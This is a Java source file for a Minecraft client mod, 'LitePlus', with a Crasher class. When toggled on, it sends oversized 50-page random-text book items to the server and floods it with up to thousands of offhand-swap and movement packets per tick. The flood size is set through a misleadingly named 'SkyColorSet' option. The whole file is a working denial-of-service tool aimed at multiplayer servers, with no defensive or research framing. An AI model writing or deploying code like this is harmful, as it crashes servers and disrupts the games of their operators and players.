package liteplus.mods;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.client.MinecraftClient;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

import static liteplus.screens.HudOptions.SkyColorSet;

public class Crasher {
    protected static MinecraftClient mc = MinecraftClient.getInstance();
    public static boolean playerCrasher = false;

    private static int getSetting(int i) {
        if (SkyColorSet == 1) {
            return 100;
        } else if (SkyColorSet == 2) {
            return 200;
        } else if (SkyColorSet == 3) {
            return 400;
        } else if (SkyColorSet == 4) {
            return 800;
        } else if (SkyColorSet == 5) {
            return 1300;
        } else if (SkyColorSet == 6) {
            return 1500;
        } else if (SkyColorSet == 7) {
            return 2000;
        } else if (SkyColorSet == 8) {
            return 4000;
        }
        return i;
    }

    public static void onCrasher() {
        if (!(mc.player == null)) {
            if (playerCrasher) {
                mc.player.sendMessage(Text.literal("§7[§6!§7] §e§lLITE§9§lPLUS§7:§c Crasher disabled"));
                playerCrasher = false;
            } else {
                mc.player.sendMessage(Text.literal("§7[§6!§7] §e§lLITE§9§lPLUS§7:§a Crasher enabled"));
                playerCrasher = true;
            }
        }
    }

    public static void onTick() {
        ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
        NbtList list = new NbtList();
        NbtCompound tag = new NbtCompound();
        String author = "LitePlus";
        String title = "\n LiteFUcks \n";
        String size = "";
        int pages = 50;
        int pageChars = 210;

        if (!(mc.player == null)) {
            if (playerCrasher) {
                if (SkyColorSet == 0) {
                    IntStream chars = new Random().ints(0x20, 0x7E);
                    size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
                    for (int i = 0; i < pages; i++) {
                        NbtString tString = NbtString.of(size);
                        list.add(tString);
                    }
                    tag.putString("author", author);
                    tag.putString("title", title);
                    tag.put("pages", list);
                    bookObj.setSubNbt("pages", list);
                    bookObj.setNbt(tag);

                    for (int i = 0; i < 4; i++) {
                        if (SkyColorSet == 0) {
                            Int2ObjectMap<ItemStack> map = new Int2ObjectOpenHashMap<>(1);
                            map.put(0, bookObj);
                            mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, 0, 0, SlotActionType.PICKUP, bookObj, map));
                        } else {
                            mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(0, bookObj));
                        }
                    }
                }

                for (int i = 0; i < getSetting(0); i++) {
                    mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN));
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(true));
                }

            }
        }
    }
}
